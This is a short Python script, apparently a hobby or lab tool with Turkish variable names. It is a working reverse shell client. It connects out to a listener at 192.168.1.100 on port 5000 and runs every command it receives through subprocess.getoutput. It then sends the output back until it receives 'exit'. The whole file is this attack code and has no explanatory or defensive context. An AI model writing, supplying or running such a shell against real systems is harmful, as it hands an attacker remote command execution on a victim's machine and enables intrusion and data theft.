import  socket
import  subprocess

host="192.168.1.100"
port=5000
socket=socket.socket()
socket.connect((host,port))
mesaj=socket.recv(5000).decode()
print(mesaj)
while True:
    komut=socket.recv(5000).decode()

    if komut.lower()=="exit":
        break
    cikti=subprocess.getoutput(komut)
    socket.send(cikti.encode())
socket.close()
